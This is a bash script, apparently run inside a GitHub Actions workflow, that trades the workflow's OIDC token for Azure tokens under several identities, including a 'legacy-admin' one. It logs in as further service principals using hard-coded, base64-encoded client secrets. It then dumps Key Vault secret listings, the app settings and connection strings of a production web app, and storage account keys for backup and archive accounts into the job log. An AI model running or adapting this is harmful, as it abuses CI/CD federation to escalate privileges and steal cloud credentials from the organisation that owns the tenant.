#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE="https://management.azure.com"

# Get GitHub OIDC JWT (standard audience)
JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')

# Login as cicd-deployer
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

ARM=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv)
VTOK=$(az account get-access-token --resource https://vault.azure.net --query accessToken -o tsv)

wif_try() {
  local label="$1" cid="$2" aud="$3" scope="$4"
  # Get OIDC JWT with specified audience
  local tok=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
    "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${aud}" | jq -r '.value // ""')
  if [ -z "$tok" ]; then echo "$label: no OIDC token for aud=$aud"; return; fi
  # Exchange for Azure token
  local result=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    --data-urlencode "client_id=$cid" \
    --data-urlencode "scope=$scope" \
    --data-urlencode "grant_type=client_credentials" \
    --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=$tok")
  local atlen=$(echo "$result" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(len(d.get("access_token","")))')
  local err=$(echo "$result" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("error","")+"::"+d.get("error_description","")[:120])' 2>/dev/null)
  echo "$label: token_len=$atlen err=$err"
  if [ "$atlen" -gt 100 ] 2>/dev/null; then
    local at=$(echo "$result" | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
    echo "$label KV_SEC: $(curl -sS 'https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4' -H "Authorization: Bearer $at" | head -c 500)"
    echo "$label ARM_RGs: $(curl -sS "$ARM_BASE/subscriptions/$SUB/resourcegroups?api-version=2021-04-01" -H "Authorization: Bearer $at" | python3 -c 'import sys,json;[print(r["name"]) for r in json.load(sys.stdin).get("value",[])]' 2>/dev/null)"
  fi
}

LEGACY="891fb158-e02c-4428-a885-53b811f369c0"
SYNC_CLIENT="462d1c38-4459-48b8-9333-82e389e59514"

echo "=== TRY LEGACY-ADMIN WIF ==="
wif_try "legacy-arm" "$LEGACY" "api://AzureADTokenExchange" "https://management.azure.com/.default"
wif_try "legacy-vault" "$LEGACY" "api://AzureADTokenExchange" "https://vault.azure.net/.default"
wif_try "legacy-syncclientaud" "$LEGACY" "$SYNC_CLIENT" "https://management.azure.com/.default"

echo "=== REPORTING APP FULL SETTINGS (reporting-service Contributor) ==="
RS_CID="12ed54de-f2eb-4784-804c-3a7a3e83a9e9"
RS_SEC=$(echo "blA4OFF+OEl+d2lwMEdPbFcxNXpkdDNGTU12QlY5TFl0YU9vZWEzeg==" | base64 -d)
RARM=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$RS_CID" --data-urlencode "client_secret=$RS_SEC" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://management.azure.com/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
echo "reporting-service ARM token len=${#RARM}"
RPT_RG="rg-tbl-reporting-prod-eus"
if [ "${#RARM}" -gt 100 ]; then
  echo "REPORTING app settings:"
  curl -sS -X POST "$ARM_BASE/subscriptions/$SUB/resourceGroups/$RPT_RG/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings/list?api-version=2022-03-01" \
    -H "Authorization: Bearer $RARM" -H "Content-Length: 0" | head -c 2000
  echo ""
  echo "REPORTING connection strings:"
  curl -sS -X POST "$ARM_BASE/subscriptions/$SUB/resourceGroups/$RPT_RG/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/connectionstrings/list?api-version=2022-03-01" \
    -H "Authorization: Bearer $RARM" -H "Content-Length: 0" | head -c 1000
  echo ""
  echo "REPORTING all resources in reporting RG:"
  curl -sS "$ARM_BASE/subscriptions/$SUB/resourceGroups/$RPT_RG/resources?api-version=2021-04-01" \
    -H "Authorization: Bearer $RARM" | python3 -c 'import sys,json;[print(r["type"]+"/"+r["name"]) for r in json.load(sys.stdin).get("value",[])]' 2>/dev/null
  echo "REPORTING site properties (get docker image):"
  curl -sS "$ARM_BASE/subscriptions/$SUB/resourceGroups/$RPT_RG/providers/Microsoft.Web/sites/app-tbl-reporting-prod?api-version=2022-03-01" \
    -H "Authorization: Bearer $RARM" | python3 -c '
import sys,json
d=json.load(sys.stdin)
p=d.get("properties",{})
print("linuxFxVersion:",p.get("siteConfig",{}).get("linuxFxVersion",""))
print("state:",p.get("state",""))
print("defaultHostName:",p.get("defaultHostName",""))
' 2>/dev/null
fi

echo "=== SYNC-SERVICE STORAGE ON BACKUP/ARCHIVE ==="
SS_CID="462d1c38-4459-48b8-9333-82e389e59514"
SS_SEC=$(echo "c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==" | base64 -d)
SST=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$SS_CID" --data-urlencode "client_secret=$SS_SEC" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://management.azure.com/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
echo "SS ARM token len=${#SST}"
for sa in sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblappcfgprodx3euoz; do
  echo "  $sa listKeys:"
  curl -sS -X POST "$ARM_BASE/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$sa/listKeys?api-version=2021-09-01" \
    -H "Authorization: Bearer $SST" -H "Content-Length: 0" | head -c 300
  echo ""
done

echo "=== REPORTING-VIEWER VS KV ==="
RV_CID="881fddce-6208-4af5-a297-7e79c912f83c"
RV_SEC=$(echo "LVRsOFF+c0gwUU9QLlZyS1doYTMtN3g0WEEySnhTNGowOG51dmJRTg==" | base64 -d)
RVVT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$RV_CID" --data-urlencode "client_secret=$RV_SEC" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://vault.azure.net/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
echo "reporting-viewer vault token len=${#RVVT}"
if [ "${#RVVT}" -gt 100 ]; then
  echo "  RV vs KV sec: $(curl -sS 'https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4' -H "Authorization: Bearer $RVVT" | head -c 400)"
  echo "  RV vs KV prod: $(curl -sS 'https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4' -H "Authorization: Bearer $RVVT" | head -c 400)"
fi

echo "=== ALL RESOURCE GROUPS ==="
curl -sS "$ARM_BASE/subscriptions/$SUB/resourcegroups?api-version=2021-04-01" \
  -H "Authorization: Bearer $ARM" | python3 -c 'import sys,json;[print(r["name"]) for r in json.load(sys.stdin).get("value",[])]'

echo "DONE"
